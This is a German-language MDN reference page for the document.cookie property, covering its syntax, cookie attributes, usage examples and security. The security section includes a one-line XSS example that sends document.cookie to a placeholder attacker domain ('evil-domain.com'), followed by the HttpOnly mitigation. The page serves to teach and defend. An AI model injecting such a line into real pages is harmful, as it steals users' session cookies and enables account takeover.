---
title: "Document: cookie-Eigenschaft"
slug: Web/API/Document/cookie
l10n:
  sourceCommit: be8f7f155a48e11b30c240f8731afb1845f85378
---

{{APIRef("DOM")}}

Die [`Document`](/de/docs/Web/API/Document)-Eigenschaft `cookie` ermöglicht das Lesen und Schreiben von [Cookies](/de/docs/Web/HTTP/Cookies), die mit dem Dokument verknüpft sind.
Sie dient als Getter und Setter für die tatsächlichen Werte der Cookies.

## Syntax

### Alle von diesem Standort zugänglichen Cookies lesen

```js
allCookies = document.cookie;
```

Im obigen Code ist `allCookies` eine Zeichenfolge, die eine durch Semikolons getrennte Liste aller Cookies enthält (d. h. `key=value`-Paare).
Beachten Sie, dass jeder _key_ und _value_ von Leerzeichen (Leerzeichen und Tabulatorzeichen) umgeben sein kann: Tatsächlich schreibt {{RFC(6265)}} ein einzelnes Leerzeichen nach jedem Semikolon vor, aber einige Benutzeragenten halten sich möglicherweise nicht daran.

### Ein neues Cookie schreiben

```js
document.cookie = newCookie;
```

Im obigen Code ist `newCookie` eine Zeichenfolge im Format `key=value`, die das Cookie angibt, das festgelegt/aktualisiert werden soll. Beachten Sie, dass Sie mit dieser Methode jeweils nur ein einzelnes Cookie festlegen/aktualisieren können. Berücksichtigen Sie auch, dass:

- Jeder der folgenden Cookie-Attributwerte optional dem Schlüssel-Wert-Paar folgen kann, jeweils mit einem Semikolon als Trennzeichen:

  - `;domain=domain` (z. B. `example.com` oder `subdomain.example.com`): Der Host, an den das Cookie gesendet wird.
    Wenn nicht angegeben, wird standardmäßig der Hostanteil des aktuellen Dokumentstandorts verwendet und das Cookie ist nicht in Subdomains verfügbar.
    Wenn ein Domainname angegeben ist, sind Subdomains immer eingeschlossen.
    Im Gegensatz zu früheren Spezifikationen werden führende Punkte in Domainnamen ignoriert, aber Browser können es ablehnen, das Cookie mit solchen Punkten zu setzen.

    > [!NOTE]
    > Die Domain _muss_ mit der Domain des JavaScript-Ursprungs übereinstimmen.
    > Die Festlegung von Cookies auf fremde Domains wird stillschweigend ignoriert.

  - `;expires=date-in-UTCString-format`: Das Ablaufdatum des Cookies. Wenn weder `expires` noch `max-age` angegeben ist, läuft es am Ende der Sitzung ab.

    > [!WARNING]
    > Wenn der Schutz der Privatsphäre der Nutzer ein Anliegen ist, ist es wichtig, dass jede Webanwendung die Cookie-Daten nach einer bestimmten Zeitspanne ungültig macht, anstatt sich darauf zu verlassen, dass der Browser dies tut.
    > Viele Browser erlauben es Nutzern, festzulegen, dass Cookies niemals ablaufen, was nicht unbedingt sicher ist.

    Siehe {{jsxref("Date.toUTCString()")}} für Hilfe beim Formatieren dieses Werts.

  - `;max-age=max-age-in-seconds`: Das maximale Alter des Cookies in Sekunden (z. B. `60*60*24*365` oder 31536000 für ein Jahr).

  - `;partitioned`: Gibt an, dass das Cookie unter Verwendung partitionierter Speicherung gespeichert werden soll. Siehe [Cookies mit unabhängiger partitionierter Speicherung (CHIPS)](/de/docs/Web/Privacy/Privacy_sandbox/Partitioned_cookies) für weitere Details.

  - `;path=path`: Der Wert des `Path`-Attributs des Cookies (Siehe [Definieren, wohin Cookies gesendet werden](/de/docs/Web/HTTP/Cookies#define_where_cookies_are_sent) für weitere Informationen).

  - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}}-Headers kann von einem Server festgelegt werden, um zu spezifizieren, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Steuerung von Drittanbieter-Cookies mit `SameSite`](/de/docs/Web/HTTP/Cookies#controlling_third-party_cookies_with_samesite)).

    - Der Wert `lax` sendet das Cookie für alle gleichseitigen Anfragen und GET-Anfragen zur obersten Navigation.
      Dies reicht für die Nutzerverfolgung aus, verhindert jedoch viele [Cross-Site Request Forgery](/de/docs/Glossary/CSRF)-Angriffe.
      Dies ist der Standardwert in modernen Browsern.
    - Der Wert `strict` verhindert, dass das Cookie vom Browser an die Zielwebsite in allen Kontextherumsituationen gesendet wird, auch wenn einem regulären Link gefolgt wird.
    - Der Wert `none` gibt ausdrücklich an, dass keine Einschränkungen angewendet werden.
      Das Cookie wird in allen Anfragen gesendet - sowohl fremden als auch gleichseitigen.

  - `;secure`: Gibt an, dass das Cookie nur über ein sicheres Protokoll übertragen werden soll.

- Der Cookie-Wert-String kann {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} verwenden, um sicherzustellen, dass die Zeichenfolge keine Kommas, Semikolons oder Leerzeichen enthält (die in Cookie-Werten unzulässig sind).
- Einige Benutzeragenten-Implementierungen unterstützen die folgenden Cookie-Präfixe:

  - `__Secure-` Signalisieren dem Browser, dass das Cookie nur in Anfragen einbezogen werden soll, die über einen sicheren Kanal übertragen werden.
  - `__Host-` Signalisieren dem Browser, dass zusätzlich zur Einschränkung, das Cookie nur von einem sicheren Ursprung zu verwenden, der Bereich des Cookies auf ein vom Server übergebenes Pfadattribut beschränkt ist.
    Wenn der Server das Pfadattribut weglässt, wird das "Verzeichnis" der Anfrage-URI verwendet.
    Es signalisiert auch, dass das Domain-Attribut nicht vorhanden sein darf, was verhindert, dass das Cookie an andere Domains gesendet wird.
    Für Chrome muss das Pfadattribut immer der Ursprung sein.

  > [!NOTE]
  > Der Bindestrich wird als Teil des Präfix betrachtet.

  > [!NOTE]
  > Diese Flags sind nur mit dem Attribut `secure` einstellbar.

> [!NOTE]
> Wie Sie aus dem obigen Code ersehen können, ist `document.cookie` eine [Accessor-Eigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit nativen _setter_- und _getter_-Funktionen und ist folglich _kein_ [Daten-Eigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit einem Wert: Was Sie schreiben, ist nicht dasselbe wie das, was Sie lesen: Alles wird immer vom JavaScript-Interpreter vermittelt.

## Beispiele

### Beispiel 1: Einfache Verwendung

```js
// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "name=oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

function showCookies() {
  const output = document.getElementById("cookies");
  output.textContent = `> ${document.cookie}`;
}

function clearOutputCookies() {
  const output = document.getElementById("cookies");
  output.textContent = "";
}
```

```html
<button onclick="showCookies()">Show cookies</button>

<button onclick="clearOutputCookies()">Clear</button>

<div>
  <code id="cookies"></code>
</div>
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}

### Beispiel 2: Ein Beispiel-Cookie namens test2 abrufen

```js
// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "test1=Hello; SameSite=None; Secure";
document.cookie = "test2=World; SameSite=None; Secure";

const cookieValue = document.cookie
  .split("; ")
  .find((row) => row.startsWith("test2="))
  ?.split("=")[1];

function showCookieValue() {
  const output = document.getElementById("cookie-value");
  output.textContent = `> ${cookieValue}`;
}

function clearOutputCookieValue() {
  const output = document.getElementById("cookie-value");
  output.textContent = "";
}
```

```html
<button onclick="showCookieValue()">Show cookie value</button>

<button onclick="clearOutputCookieValue()">Clear</button>

<div>
  <code id="cookie-value"></code>
</div>
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}

### Beispiel 3: Etwas nur einmal tun

Um den folgenden Code zu verwenden, ersetzen Sie bitte alle Vorkommen des Wortes `doSomethingOnlyOnce` (der Name des Cookies) durch einen benutzerdefinierten Namen.

```js
function doOnce() {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    // Note that we are setting `SameSite=None;` in this example because the example
    // needs to work cross-origin.
    // It is more common not to set the `SameSite` attribute, which results in the default,
    // and more secure, value of `SameSite=Lax;`
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    const output = document.getElementById("do-once");
    output.textContent = "> Do something here!";
  }
}

function clearOutputDoOnce() {
  const output = document.getElementById("do-once");
  output.textContent = "";
}
```

```html
<button onclick="doOnce()">Only do something once</button>

<button onclick="clearOutputDoOnce()">Clear</button>

<div>
  <code id="do-once"></code>
</div>
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}

### Beispiel 4: Das vorherige Cookie zurücksetzen

```js
function resetOnce() {
  // Note that we are setting `SameSite=None;` in this example because the example
  // needs to work cross-origin.
  // It is more common not to set the `SameSite` attribute, which results in the default,
  // and more secure, value of `SameSite=Lax;`
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";

  const output = document.getElementById("reset-once");
  output.textContent = "> Reset!";
}

function clearOutputResetOnce() {
  const output = document.getElementById("reset-once");
  output.textContent = "";
}
```

```html
<button onclick="resetOnce()">Reset only once cookie</button>

<button onclick="clearOutputResetOnce()">Clear</button>

<div>
  <code id="reset-once"></code>
</div>
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}

### Beispiel 5: Die Existenz eines Cookies überprüfen

```js
// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "reader=1; SameSite=None; Secure";

function checkACookieExists() {
  if (
    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
  ) {
    const output = document.getElementById("a-cookie-existence");
    output.textContent = '> The cookie "reader" exists';
  }
}

function clearOutputACookieExists() {
  const output = document.getElementById("a-cookie-existence");
  output.textContent = "";
}
```

```html
<button onclick="checkACookieExists()">Check a cookie exists</button>

<button onclick="clearOutputACookieExists()">Clear</button>

<div>
  <code id="a-cookie-existence"></code>
</div>
```

{{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}

### Beispiel 6: Überprüfen, ob ein Cookie einen bestimmten Wert hat

```js
function checkCookieHasASpecificValue() {
  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
    const output = document.getElementById("a-specific-value-of-the-cookie");
    output.textContent = '> The cookie "reader" has a value of "1"';
  }
}

function clearASpecificValueOfTheCookie() {
  const output = document.getElementById("a-specific-value-of-the-cookie");
  output.textContent = "";
}
```

```html
<button onclick="checkCookieHasASpecificValue()">
  Check that a cookie has a specific value
</button>

<button onclick="clearASpecificValueOfTheCookie()">Clear</button>

<div>
  <code id="a-specific-value-of-the-cookie"></code>
</div>
```

{{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}

## Sicherheit

Es ist wichtig zu beachten, dass das `path`-Attribut _nicht_ vor unbefugtem Lesen des Cookies von einem anderen Pfad schützt.
Es kann leicht umgangen werden, indem das DOM genutzt wird, zum Beispiel durch das Erstellen eines versteckten {{HTMLElement("iframe")}}-Elements mit dem Pfad des Cookies und dem anschließendem Zugriff auf die `contentDocument.cookie`-Eigenschaft dieses iframes.
Der einzige Weg, das Cookie zu schützen, ist die Verwendung einer anderen Domain oder Subdomain aufgrund der [Same-Origin-Richtlinie](/de/docs/Web/Security/Same-origin_policy).

Cookies werden oft in Webanwendungen verwendet, um einen Benutzer und seine authentifizierte Sitzung zu identifizieren.
Das Stehlen eines Cookies von einer Webanwendung führt zur Übernahme der authentifizierten Benutzersitzung.
Gemeinsame Methoden, um Cookies zu stehlen, sind durch [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder durch Ausnutzung einer [Cross-Site-Scripting](/de/docs/Glossary/Cross-site_scripting) (XSS)-Schwachstelle in der Anwendung -

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

Das `HTTPOnly`-Cookie-Attribut kann helfen, diesen Angriff zu mildern, indem der Zugriff auf den Cookie-Wert durch JavaScript verhindert wird.
Lesen Sie mehr über [Cookies und Sicherheit](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).

## Anmerkungen

- Ab Firefox 2 ist ein besserer Mechanismus für die clientseitige Speicherung verfügbar - [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API).
- Sie können ein Cookie löschen, indem Sie dessen Ablaufzeit auf null aktualisieren.
- Beachten Sie, dass mit zunehmender Anzahl an Cookies mehr Daten zwischen dem Server und dem Client für jede Anfrage übertragen werden.
  Dies macht jede Anfrage langsamer.
  Es wird dringend empfohlen, [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API) zu verwenden, wenn Sie "client-only"-Daten speichern möchten.
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Abschnitt 5.3, "Implementierungsgrenzen") gibt an, dass es **keine maximale Länge** für die Größe des Cookie-Schlüssels oder -Werts geben sollte und ermutigt Implementierungen, **beliebig große Cookies** zu unterstützen.
  Die maximale Umsetzung jedes Browsers wird notwendigerweise unterschiedlich sein, konsultieren Sie also die jeweilige Browserdokumentation.

Der Grund für die [Syntax](#syntax) der `document.cookie`-Accessor-Eigenschaft liegt in der Client-Server-Natur von Cookies, die sich von anderen Client-Client-Speichermethoden unterscheidet (wie zum Beispiel [localStorage](/de/docs/Web/API/Web_Storage_API)):

### Der Server weist den Client an, ein Cookie zu speichern

```bash
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: cookie_name1=cookie_value1
Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

[content of the page here]
```

### Der Client sendet seine zuvor gespeicherten Cookies an den Server zurück

```bash
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
Accept: */*
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [HTTP Cookies](/de/docs/Web/HTTP/Cookies)
- [DOM Storage](/de/docs/Web/API/Web_Storage_API)
- [`URL.pathname`](/de/docs/Web/API/URL/pathname)
- {{jsxref("Date.toUTCString()")}}
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)
